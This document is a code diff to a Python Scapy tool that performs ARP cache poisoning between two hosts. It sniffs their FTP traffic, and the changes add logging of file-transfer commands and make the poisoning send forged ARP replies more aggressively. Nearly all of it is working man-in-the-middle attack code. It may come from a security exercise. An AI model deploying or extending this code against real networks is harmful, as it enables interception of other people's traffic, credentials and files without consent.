@@ -29,12 +29,17 @@ def print_info(state, msg, error=False):
     else:
         print(BLUE + state + msg + END)
 
-def packet_callback(packet):
+def packet_printer(packet):
     if packet.haslayer(TCP) and packet[TCP].dport == 21:
         if VERBOSE:
             print_info("| 📡  |  ", f"FTP Packet: {packet[IP].src} -> {packet[IP].dst}")
-        if Raw in packet:
-            print_info("| 📡  |  ", f"Payload: {packet[Raw].load.decode('utf-8', errors='ignore')}")
+            if Raw in packet:
+                print_info("| 📡  |  ", f"Payload: {packet[Raw].load.decode('utf-8', errors='ignore')}")
+        else:
+            if Raw in packet:
+                payload = packet[Raw].load.decode('utf-8', errors='ignore')
+                if any(cmd in payload for cmd in ['STOR', 'RETR']):
+                    print_info("| 📡  |  ", f"File transfer: {payload}")
 
 def arp_spoofing(args):
     try:
@@ -45,7 +50,7 @@ def arp_spoofing(args):
         
         sniff = AsyncSniffer(
             filter=f"host {args.IP_target} and tcp port 21",
-            prn=packet_callback,
+            prn=packet_printer,
             store=0
         )
         sniff.start()
@@ -53,7 +58,7 @@ def arp_spoofing(args):
         while True:
             poison_target = Ether(dst=args.MAC_target)/ARP(
                 op=2,
-                hwsrc=attacker_mac,
+                hwsrc=attacker_mac, 
                 pdst=args.IP_target,
                 psrc=args.IP_src,
                 hwdst=args.MAC_target
@@ -67,9 +72,9 @@ def arp_spoofing(args):
                 hwdst=args.MAC_src
             )
 
-            sendp(poison_target, verbose=0)
-            sendp(poison_source, verbose=0)
-            time.sleep(1)
+            sendp(poison_target,count=3, verbose = 0)
+            sendp(poison_source,count=3, verbose = 0)
+            time.sleep(0.1)
 
     except KeyboardInterrupt:
         print_info("| 🏳️  |  ", "Stopping ARP Spoofing...")
